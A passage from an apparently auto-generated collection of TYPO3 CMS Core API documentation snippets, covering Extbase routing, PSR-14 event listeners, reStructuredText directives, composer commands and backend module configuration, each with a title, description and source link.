https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/UriArguments.rst#2025-04-16_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\n// Linebreaks just for readability.\nhttps://example.org/blog/?tx_blogexample_bloglist[action]=show\n&tx_blogexample_bloglist[controller]=Post\n&tx_blogexample_bloglist[post]=4711\n&cHash=...\n\n// Actually, the [] parameters are often URI encoded, so this is emitted:\nhttps://example.org/blog/?tx_blogexample_bloglist%5Baction%5D=show\n&tx_blogexample_bloglist%5Bcontroller%5D=Post\n&tx_blogexample_bloglist%5Bpost%5D=4711\n&cHash=...\n```\n\n----------------------------------------\n\nTITLE: Configuring PageLinkHandler in TYPO3 Page TSconfig\nDESCRIPTION: Basic configuration of the PageLinkHandler in TYPO3's page TSconfig, defining the handler class and label.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LinkHandling/Linkhandler/PageLinkHandler.rst#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\nTCEMAIN.linkHandler {\n   page {\n      handler = TYPO3\\CMS\\Backend\\LinkHandler\\PageLinkHandler\n      label = LLL:EXT:backend/Resources/Private/Language/locallang_browse_links.xlf:page\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Table of Contents for TYPO3 System Settings in reStructuredText\nDESCRIPTION: This snippet configures a Table of Contents (toctree) directive in reStructuredText format for TYPO3 system settings documentation. It uses glob pattern matching to automatically include all index files from subdirectories.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/SystemSettings/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: restructuredtext\nCODE:\n```\n..  toctree::\n    :glob:\n    :titlesonly:\n\n    */Index\n```\n\n----------------------------------------\n\nTITLE: Registering Global Services in TYPO3 with T3_SERVICES\nDESCRIPTION: T3_SERVICES involves the global registration of services in TYPO3 and is initialized by the `SystemEnvironmentBuilder::initializeGlobalVariables()` method. It allows for consistent service definition and utilization throughout the system.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/GlobalVariables.rst#2025-04-16_snippet_2\n\n\n\n----------------------------------------\n\nTITLE: Configuring Extbase Plugin Route Enhancer in TYPO3\nDESCRIPTION: This YAML configuration sets up an Extbase plugin route enhancer for a news extension. It defines various route paths, controllers, and arguments for list, detail, and tag views. It also includes aspect configurations for mapping and transforming URL segments.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Routing/AdvancedRoutingConfiguration.rst#2025-04-16_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nrouteEnhancers:\n  NewsPlugin:\n    type: Extbase\n    limitToPages: [13]\n    extension: News\n    plugin: Pi1\n    routes:\n      - routePath: '/list/'\n        _controller: 'News::list'\n      - routePath: '/list/{page}'\n        _controller: 'News::list'\n        _arguments:\n          page: '@widget_0/currentPage'\n      - routePath: '/detail/{news_title}'\n        _controller: 'News::detail'\n        _arguments:\n          news_title: 'news'\n      - routePath: '/tag/{tag_name}'\n        _controller: 'News::list'\n        _arguments:\n          tag_name: 'overwriteDemand/tags'\n      - routePath: '/list/{year}/{month}'\n        _controller: 'News::list'\n        _arguments:\n          year: 'overwriteDemand/year'\n          month: 'overwriteDemand/month'\n        requirements:\n          year: '\\d+'\n          month: '\\d+'\n    defaultController: 'News::list'\n    defaults:\n      page: '0'\n    aspects:\n      news_title:\n        type: PersistedAliasMapper\n        tableName: tx_news_domain_model_news\n        routeFieldName: path_segment\n      page:\n        type: StaticRangeMapper\n        start: '1'\n        end: '100'\n      month:\n        type: StaticRangeMapper\n        start: '1'\n        end: '12'\n      year:\n        type: StaticRangeMapper\n        start: '1984'\n        end: '2525'\n      tag_name:\n        type: PersistedAliasMapper\n        tableName: tx_news_domain_model_tag\n        routeFieldName: slug\n```\n\n----------------------------------------\n\nTITLE: Setting Documentation Index for Request Attributes\nDESCRIPTION: Defines an index entry for 'Request attributes' in the documentation, making it searchable in the generated documentation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/RequestLifeCycle/RequestAttributes/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: rst\nCODE:\n```\n.. index::\n   Request attributes\n```\n\n----------------------------------------\n\nTITLE: Accessing removed entity in TYPO3 Extbase Persistence Event\nDESCRIPTION: The getObject() method allows retrieving the domain object that was removed from persistence. It returns a DomainObjectInterface representing the entity that was just deleted.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Extbase/EntityRemovedFromPersistenceEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\ngetObject()\n```\n\n----------------------------------------\n\nTITLE: Referencing TYPO3 Cache Frontend Interface in PHP\nDESCRIPTION: Specifies the main interface for handling cache entries of a specific cache in TYPO3. This interface is used to interact with different frontends for various data types.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/CachingFramework/Architecture/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Cache\\Frontend\\FrontendInterface\n```\n\n----------------------------------------\n\nTITLE: Simulating Execution Time with SIM_EXEC_TIME in TYPO3\nDESCRIPTION: SIM_EXEC_TIME mirrors EXEC_TIME but allows alterations for simulation purposes, such as previewing future or past data sets. Like EXEC_TIME, its usage is discouraged in favor of the DateTime Aspect.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/GlobalVariables.rst#2025-04-16_snippet_8\n\n\n\n----------------------------------------\n\nTITLE: Implementing ModifyImageSourceCollectionEvent Listener in TYPO3\nDESCRIPTION: Example event listener implementation that shows how to modify image source collections in TYPO3's frontend rendering. The listener can enrich the final source collection result within ContentObjectRenderer.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Frontend/ModifyImageSourceCollectionEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\\ndeclare(strict_types=1);\\n\\nnamespace MyVendor\\MyExtension\\Frontend\\EventListener;\\n\\nuse TYPO3\\CMS\\Frontend\\ContentObject\\Event\\ModifyImageSourceCollectionEvent;\\n\\nfinal class MyEventListener\\n{\\n    public function __invoke(ModifyImageSourceCollectionEvent $event): void\\n    {\\n        // Add custom logic here\\n    }\\n}\n```\n\n----------------------------------------\n\nTITLE: Embedding Image with reStructuredText in TYPO3 Documentation\nDESCRIPTION: This snippet demonstrates how to embed an image within TYPO3 documentation using reStructuredText. It utilizes the ``.. figure::`` directive to include an image, specify its path, and apply a CSS class for styling. This approach is commonly used for visual aids and screenshots in TYPO3 documentation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/AutomaticScreenshots/QuickInstall/Step4AdminUserSitename.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: reStructuredText\nCODE:\n```\n.. figure:: /Images/AutomaticScreenshots/QuickInstall/Step4AdminUserSitename.png\n   :class: with-shadow\n\n   Install Tool in 1-2-3 mode, forth step.\n```\n\n----------------------------------------\n\nTITLE: Implementing ModifyEditFileFormDataEvent Listener in PHP\nDESCRIPTION: This code snippet demonstrates how to create an event listener for the ModifyEditFileFormDataEvent. It shows the structure of the listener class and how to modify the form data within the event.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Filelist/ModifyEditFileFormDataEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\FileList\\EventListener;\n\nuse TYPO3\\CMS\\Filelist\\Event\\ModifyEditFileFormDataEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(ModifyEditFileFormDataEvent $event): void\n    {\n        $formData = $event->getFormData();\n        $formData['customData'] = 'My custom data';\n        $event->setFormData($formData);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: BeforeLoadedUserTsConfigEvent Class Definition\nDESCRIPTION: PHP class that handles user TSconfig events in TYPO3 CMS. The class provides methods to manage TSconfig before it's loaded from other sources like the global user.tsconfig file. The configuration should be static and not depend on runtime or request.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/BeforeLoadedUserTsConfigEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\TypoScript\\IncludeTree\\Event;\n\nclass BeforeLoadedUserTsConfigEvent {\n    public function getTsConfig(): array\n    \n    public function addTsConfig(string $tsConfig)\n    \n    public function setTsConfig(array $tsConfig)\n}\n```\n\n----------------------------------------\n\nTITLE: Checking Installed TYPO3 Packages with Composer\nDESCRIPTION: Command to list all currently installed TYPO3 packages before upgrading to identify which packages need to be included in the upgrade process.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/Major/UpgradeCore.rst#2025-04-16_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ncomposer info \"typo3/*\"\n```\n\n----------------------------------------\n\nTITLE: Implementing One-to-Many Relationship in Extbase Domain Model\nDESCRIPTION: This code demonstrates how to implement a 1:n relationship between Blog and Post models in Extbase, with lazy loading enabled for posts and cascade remove for proper deletion of child objects.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Domain/Model.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n/**\n * The posts of this blog\n *\n * @var \\TYPO3\\CMS\\Extbase\\Persistence\\ObjectStorage<\\MyVendor\\MyExtension\\Domain\\Model\\Post>\n * @TYPO3\\CMS\\Extbase\\Annotation\\ORM\\Lazy\n * @TYPO3\\CMS\\Extbase\\Annotation\\ORM\\Cascade(\"remove\")\n */\nprotected $posts = null;\n\n/**\n * Initializes all ObjectStorage properties when model is constructed\n */\npublic function __construct()\n{\n    $this->posts = new \\TYPO3\\CMS\\Extbase\\Persistence\\ObjectStorage();\n}\n\n/**\n * Get the posts of this blog\n *\n * @return \\TYPO3\\CMS\\Extbase\\Persistence\\ObjectStorage<\\MyVendor\\MyExtension\\Domain\\Model\\Post>\n */\npublic function getPosts()\n{\n    return $this->posts;\n}\n\n/**\n * Sets the posts of this blog\n *\n * @param \\TYPO3\\CMS\\Extbase\\Persistence\\ObjectStorage<\\MyVendor\\MyExtension\\Domain\\Model\\Post> $posts\n */\npublic function setPosts(\\TYPO3\\CMS\\Extbase\\Persistence\\ObjectStorage $posts)\n{\n    $this->posts = $posts;\n}\n\n/**\n * Add a post to this blog\n *\n * @param \\MyVendor\\MyExtension\\Domain\\Model\\Post $post\n */\npublic function addPost(\\MyVendor\\MyExtension\\Domain\\Model\\Post $post)\n{\n    $this->posts->attach($post);\n}\n\n/**\n * Remove post from this blog\n *\n * @param \\MyVendor\\MyExtension\\Domain\\Model\\Post $postToRemove\n */\npublic function removePost(\\MyVendor\\MyExtension\\Domain\\Model\\Post $postToRemove)\n{\n    $this->posts->detach($postToRemove);\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring SEO Documentation Structure in RST\nDESCRIPTION: reStructuredText configuration for SEO events documentation, including page title, index directives, and table of contents setup.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/SEO/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n..  include:: /Includes.rst.txt\n..  index:: pair: Events; SEO\n..  _eventlist-seo:\n\n===\nSeo\n===\n\nThe following list contains :ref:`PSR-14 events <EventDispatcher>`\nin EXT:seo.\n\n**Contents:**\n\n..  toctree::\n    :titlesonly:\n    :glob:\n\n    *\n```\n\n----------------------------------------\n\nTITLE: PHP Class Definition - BeforeRedirectMatchDomainEvent\nDESCRIPTION: Class definition for BeforeRedirectMatchDomainEvent that handles redirect matching in TYPO3 CMS. This event is triggered during redirect matching process and allows custom implementation of match methods.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Redirects/BeforeRedirectMatchDomainEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Redirects\\Event;\n\nclass BeforeRedirectMatchDomainEvent {\n    public function getDomain(): string\n    public function getPath(): string\n    public function getQuery(): string\n    public function getMatchDomainName(): string\n    public function getMatchedRedirect(): ?array\n    public function setMatchedRedirect(?array $matchedRedirect)\n}\n```\n\n----------------------------------------\n\nTITLE: JSON Database Field Declaration in TYPO3\nDESCRIPTION: Example of defining a native JSON field type in an extension's SQL schema file, which enables automatic serialization/deserialization of PHP arrays or JsonSerializable objects.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/Connection/Index.rst#2025-04-16_snippet_13\n\nLANGUAGE: php\nCODE:\n```\nCREATE TABLE tx_myextension_domain_model_mytable (\n\ttitle varchar(255) DEFAULT '' NOT NULL,\n\tsettings json,\n);\n```\n\n----------------------------------------\n\nTITLE: XML Country Translation File - Klingon\nDESCRIPTION: XML language file containing Klingon translations for the custom country\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Country/BeforeCountriesEvaluatedEvent.rst#2025-04-16_snippet_4\n\nLANGUAGE: xml\nCODE:\n```\n<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?>\n<xliff version=\"1.2\">\n    <file source-language=\"en\" target-language=\"tlh\" datatype=\"plaintext\" original=\"messages\">\n        <header/>\n        <body>\n            <trans-unit id=\"XX\" resname=\"XX\">\n                <source>Magic Kingdom</source>\n                <target>meq'mey wo'</target>\n            </trans-unit>\n        </body>\n    </file>\n</xliff>\n```\n\n----------------------------------------\n\nTITLE: Implementing DeferredAction with RequireJS in TYPO3 Notification API\nDESCRIPTION: Example showing how to implement a DeferredAction in the TYPO3 Notification API using RequireJS for compatibility with TYPO3 v11. The action performs an AJAX request that returns a Promise.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FlashMessages/NotificationApi.rst#2025-04-16_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\ndefine([\n  'TYPO3/CMS/Backend/Notification',\n  'TYPO3/CMS/Backend/ActionButton/DeferredAction',\n  'TYPO3/CMS/Core/Ajax/AjaxRequest'\n], function(Notification, DeferredAction, AjaxRequest) {\n  'use strict';\n\n  Notification.info(\n    'Update required', \n    'The system requires an update.',\n    0,\n    [\n      {\n        label: 'Execute update',\n        action: new DeferredAction(() => {\n          return new AjaxRequest('/api/upgrade').post({\n            // Parameters\n          }).then(async (response) => {\n            const result = await response.resolve();\n            if (result.success) {\n              Notification.success('Updated', 'System successfully updated');\n            }\n            return result;\n          });\n        })\n      }\n    ]\n  );\n});\n\n```\n\n----------------------------------------\n\nTITLE: Retrieving Field Name in BeforeFlexFormDataStructureIdentifierInitializedEvent\nDESCRIPTION: This method returns the field name for the current record.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/BeforeFlexFormDataStructureIdentifierInitializedEvent.rst.txt#2025-04-16_snippet_3\n\nLANGUAGE: PHP\nCODE:\n```\nphp:method:: getFieldName()\n    :returns: `string`\n```\n\n----------------------------------------\n\nTITLE: Accessing the TCA Global Variable in TYPO3 PHP\nDESCRIPTION: Shows how to access the Table Configuration Array (TCA) in TYPO3 through the global variable. The TCA is a PHP array that can be extended and modified for extension development.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/ExtendingTca/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n$GLOBALS['TCA']\n```\n\n----------------------------------------\n\nTITLE: Displaying Help for TYPO3 Cache Flush Command (Legacy)\nDESCRIPTION: Demonstrates how to show help information for the cache:flush command in a legacy TYPO3 installation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/CommandControllers/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\ntypo3/sysext/core/bin/typo3 cache:flush -h\n```\n\n----------------------------------------\n\nTITLE: TYPO3 Release Package Structure\nDESCRIPTION: Example of TYPO3 CMS release package file structure showing main distribution files and their corresponding signature files.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Installation/ReleaseIntegrity.rst#2025-04-16_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ntypo3_src-12.4.11.tar.gz\ntypo3_src-12.4.11.tar.gz.sig\ntypo3_src-12.4.11.zip\ntypo3_src-12.4.11.zip.sig\n```\n\n----------------------------------------\n\nTITLE: Special Foreach Loop Pattern in PHP\nDESCRIPTION: Describes a PHP foreach loop pattern using a dummy variable when the loop's value is not needed, optimizing performance.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodingGuidelines/CglPhp/PhpSyntaxFormatting.rst#2025-04-16_snippet_17\n\nLANGUAGE: php\nCODE:\n```\nforeach ($GLOBALS['TCA'] as $table => $_) {\n    // Do something with $table\n}\n```\n\n----------------------------------------\n\nTITLE: Installing TYPO3 Lowlevel Extension via Composer\nDESCRIPTION: Command to install the TYPO3 lowlevel system extension which is required for DB Check and Configuration modules.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Troubleshooting/SystemModules.rst#2025-04-16_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ncomposer req typo3/cms-lowlevel\n```\n\n----------------------------------------\n\nTITLE: Handling MacOS Specific Errors in Shell Scripts\nDESCRIPTION: The snippet provides steps to handle compatibility issues with the 'readlink' command on MacOS. It suggests using the 'greadlink' tool and offers a command to create a symlink for compatibility with 'runTests.sh' in automated testing environments.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/Tutorial/Enetcache.rst#2025-04-16_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\nln -s \"$(which greadlink)\" \"$(dirname \"$(which greadlink)\")/readlink\"\n```\n\n----------------------------------------\n\nTITLE: Implementing BlogController Class with Update Action in TYPO3 CMS (PHP)\nDESCRIPTION: This code snippet defines a BlogController class with an updateAction method. The method updates an existing blog, performs admin access check, and uses validation. It throws a NoBlogAdminAccessException if access is denied.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/Validator/ObjectValidatorUsage.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nuse Psr\\Http\\Message\\ResponseInterface;\nuse T3docs\\BlogExample\\Domain\\Model\\Blog;\nuse T3docs\\BlogExample\\Exception\\NoBlogAdminAccessException;\nuse TYPO3\\CMS\\Extbase\\Annotation\\Validate;\n\nclass BlogController extends AbstractController\n{\n    /**\n     * Updates an existing blog\n     *\n     * $blog is a not yet persisted clone of the original blog containing\n     * the modifications\n     *\n     * @Validate(param=\"blog\", validator=\"T3docs\\BlogExample\\Domain\\Validator\\BlogValidator\")\n     * @throws NoBlogAdminAccessException\n     */\n    public function updateAction(Blog $blog): ResponseInterface\n    {\n        $this->checkBlogAdminAccess();\n        $this->blogRepository->update($blog);\n        $this->addFlashMessage('updated');\n        return $this->redirect('index');\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: PHP SetRegistry Has Set\nDESCRIPTION: Example of checking for site set definition availability.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/SiteSets.rst#2025-04-16_snippet_9\n\nLANGUAGE: php\nCODE:\n```\n$hasSet = $setRegistry->hasSet('my-vendor/my-set');\n```\n\n----------------------------------------\n\nTITLE: Setting Identifier in BeforeFlexFormDataStructureIdentifierInitializedEvent\nDESCRIPTION: This method allows defining the data structure identifier for the TCA field. Setting an identifier stops event propagation immediately.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/BeforeFlexFormDataStructureIdentifierInitializedEvent.rst.txt#2025-04-16_snippet_5\n\nLANGUAGE: PHP\nCODE:\n```\nphp:method:: setIdentifier(array $identifier)\n\n    Allows to define the data structure identifier for the TCA field.\n\n    Setting an identifier will immediately stop propagation. Avoid\n    setting this parameter to an empty array as this will also stop\n    propagation.\n\n    :param $identifier: the identifier\n```\n\n----------------------------------------\n\nTITLE: Defining BrokenLinkAnalysisEvent Class in PHP for TYPO3 CMS Core\nDESCRIPTION: This snippet defines the BrokenLinkAnalysisEvent class in the TYPO3\\CMS\\Core\\Html\\Event namespace. It includes methods for link validation and analysis, such as checking propagation status, retrieving link type and data, and marking links as broken.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/BrokenLinkAnalysisEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\Html\\Event;\n\nclass BrokenLinkAnalysisEvent\n{\n    public function isPropagationStopped(): bool\n    {\n        // Implementation not shown\n    }\n\n    public function getLinkType(): string\n    {\n        // Implementation not shown\n    }\n\n    public function getLinkData(): array\n    {\n        // Implementation not shown\n    }\n\n    public function markAsCheckedLink()\n    {\n        // Implementation not shown\n    }\n\n    public function markAsBrokenLink(string $reason = '')\n    {\n        // Implementation not shown\n    }\n\n    public function isBrokenLink(): bool\n    {\n        // Implementation not shown\n    }\n\n    public function getReason(): string\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating ReStructuredText Reference Label for Folders Architecture\nDESCRIPTION: This directive creates a reference label 'architecture-folders' that can be used to link to this section from other parts of the documentation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fal/Architecture/Folders.rst#2025-04-16_snippet_2\n\nLANGUAGE: restructuredtext\nCODE:\n```\n..  _architecture-folders:\n```\n\n----------------------------------------\n\nTITLE: RST Hint Directive\nDESCRIPTION: RST directive providing a hint about editor permissions for slug field modification.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Routing/PageBasedRouting.rst#2025-04-16_snippet_2\n\nLANGUAGE: rst\nCODE:\n```\n..  hint::\n    Ensure that editors have the necessary permissions to modify the `slug`\n    field if they need to change or update slugs when modifying page titles.\n```\n\n----------------------------------------\n\nTITLE: Converting Typotags to HTML in reStructuredText\nDESCRIPTION: This snippet explains how typotags are converted to standard HTML tags for RTE compatibility.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Rte/HistoricalRteTransformations/RteTransformationsInContentElements.rst#2025-04-16_snippet_2\n\nLANGUAGE: reStructuredText\nCODE:\n```\nall :code:`<LINK>`-tags are converted into regular\n:code:`<A>`-tags, all :code:`<TYPOLIST>` tags are converted into :code:`<OL>` or :code:`<UL>` sections\n(ordered/unordered lists, type depends on the type set for the\n:code:`<TYPOLIST>` tag!), :code:`<TYPOHEAD>`-tags are converted to <Hx> tags where the\nnumber is determined by the type-parameter set for the :code:`<TYPOHEAD>`-tag.\n```\n\n----------------------------------------\n\nTITLE: Implementing AfterTemplatesHaveBeenDeterminedEvent Listener in TYPO3\nDESCRIPTION: Example implementation of an event listener for AfterTemplatesHaveBeenDeterminedEvent that demonstrates how to manipulate sys_template rows. The listener receives the template rows and server request interface as parameters.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/TypoScript/AfterTemplatesHaveBeenDeterminedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\\n\\ndeclare(strict_types=1);\\n\\nnamespace MyVendor\\MyExtension\\TypoScript\\EventListener;\\n\\nuse TYPO3\\CMS\\Core\\TypoScript\\IncludeTree\\Event\\AfterTemplatesHaveBeenDeterminedEvent;\\n\\nfinal class MyEventListener\\n{\\n    public function __invoke(AfterTemplatesHaveBeenDeterminedEvent $event): void\\n    {\\n        $templates = $event->getTemplates();\\n        $request = $event->getRequest();\\n        // Manipulate $templates array\\n        $event->setTemplates($templates);\\n    }\\n}\n```\n\n----------------------------------------\n\nTITLE: Defining TYPO3 BeforeUserLogoutEvent Class Methods\nDESCRIPTION: Documents the PHP class BeforeUserLogoutEvent with methods for handling user logout process. Includes methods for retrieving user information, controlling the logout flow, and accessing user session data.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/BeforeUserLogoutEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\Authentication\\Event;\n\nclass BeforeUserLogoutEvent {\n    public function getUser(): \\TYPO3\\CMS\\Core\\Authentication\\AbstractUserAuthentication;\n    public function disableRegularLogoutProcess(): void;\n    public function enableRegularLogoutProcess(): void;\n    public function shouldLogout(): bool;\n    public function getUserSession(): ?\\TYPO3\\CMS\\Core\\Session\\UserSession;\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Module Routes in TYPO3 Backend\nDESCRIPTION: Example of defining routes for a TYPO3 backend module, including the default route and additional subroutes with specific controllers and actions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendModules/ModuleConfiguration/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\nreturn [\n    'my_module' => [\n        'routes' => [\n            '_default' => [\n                'target' => MyController::class . '::listAction',\n            ],\n            'edit' => [\n                'target' => MyController::class . '::editAction',\n                'methods' => ['GET', 'POST'],\n            ],\n        ],\n    ],\n];\n```\n\n----------------------------------------\n\nTITLE: Parsing T3DataStructure XML to PHP Array\nDESCRIPTION: Converting a T3DataStructure XML document into a PHP array using the GeneralUtility::xml2array() method. This is the standard way to parse T3DataStructure for programmatic use in TYPO3.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FlexForms/T3datastructure/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nGeneralUtility::xml2array()\n```\n\n----------------------------------------\n\nTITLE: Setting Application Context in Nginx configuration\nDESCRIPTION: Demonstrates how to set the TYPO3_CONTEXT environment variable in an Nginx server configuration file.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/SystemSettings/ApplicationContext/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: text\nCODE:\n```\nfastcgi_param TYPO3_CONTEXT Development;\n```\n\n----------------------------------------\n\nTITLE: Configuring Sudo Mode for Backend Modules in PHP\nDESCRIPTION: This code snippet demonstrates how to configure sudo mode for backend modules in TYPO3. It shows the setup for sudo mode group and lifetime within the module configuration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendModules/SudoMode.rst#2025-04-16_snippet_2\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\n\nuse TYPO3\\CMS\\Backend\\Security\\SudoMode\\Access\\AccessLifetime;\n\nreturn [\n    'my_module' => [\n        'parent' => 'system',\n        'position' => ['after' => 'Web'],\n        'access' => 'admin',\n        'workspaces' => 'live',\n        'path' => '/module/my-module',\n        'labels' => 'LLL:EXT:my_extension/Resources/Private/Language/locallang_my_module.xlf',\n        'icon' => 'my-extension-my-module',\n        'routes' => [\n            '_default' => [\n                'target' => MyVendor\\MyExtension\\Controller\\MyModuleController::class . '::handleRequest',\n            ],\n        ],\n        'sudoMode' => [\n            'group' => 'my-module-group',\n            'lifetime' => AccessLifetime::long,\n        ],\n    ],\n];\n```\n\n----------------------------------------\n\nTITLE: Configuring Error Display in Apache .htaccess for Performance\nDESCRIPTION: Apache .htaccess configuration for high-performance environments that completely disables both error display and logging. This removes all error handling overhead to maximize performance but eliminates error tracking.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ErrorAndExceptionHandling/Examples/Index.rst#2025-04-16_snippet_6\n\nLANGUAGE: apacheconf\nCODE:\n```\nphp_flag display_errors off\nphp_flag log_errors off\n```\n\n----------------------------------------\n\nTITLE: Retrieving Request Token in TYPO3 Controller\nDESCRIPTION: This snippet demonstrates how to generate a request token in a TYPO3 controller action. It creates a SecurityAspect, generates a request token with a specific scope, and assigns it to the view for form protection.\nSOURCE: 